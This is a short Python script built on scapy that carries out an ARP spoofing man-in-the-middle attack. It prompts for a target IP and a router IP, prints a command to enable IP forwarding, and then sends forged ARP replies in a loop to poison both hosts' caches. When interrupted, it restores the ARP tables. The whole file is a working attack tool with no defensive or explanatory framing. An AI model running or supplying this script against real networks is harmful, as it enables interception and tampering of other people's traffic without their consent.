#!/usr/bin/env python

import scapy.all as scapy
import time 
import subprocess
import sys

targetip = input("[-] Enter the target ip > ")
spoofip = input("[-] Enter router's ip > ")
print("[+] Run in Python3 ")

print("[+] enableing prot forwarding by running :-")
print("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  
	arp_request_broadcast = broadcast/arp_request 
	answerd_list = scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0] # v2
	return answerd_list[0][1].hwsrc

def spoof(targetip, spoofip):
	targetmac = get_mac(targetip)
	packet = scapy.ARP(op=2,pdst=targetip,hwdst=targetmac,psrc=spoofip)
	scapy.send(packet,verbose=False)


def restore(dest_ip,src_ip):
	dst_mac = get_mac(dest_ip)
	src_mac = get_mac(src_ip)
	packet = scapy.ARP(op=2,pdst=dest_ip, hwdst=dst_mac, psrc=src_ip)
	scapy.send(packet,count=4,verbose=False)
try:
	sent_packets_count = 0
	while True:
		spoof(targetip,spoofip)
		spoof(spoofip ,targetip)
		sent_packets_count = sent_packets_count + 2
		print("\r[+] Packet's Count : " + str(sent_packets_count),end="")
		time.sleep(2)

except KeyboardInterrupt:
	print("[+] Restoreing arp table at the targets ....")
	restore(targetip,spoofip)
	restore(spoofip,targetip)
	print("[-] BYE :)")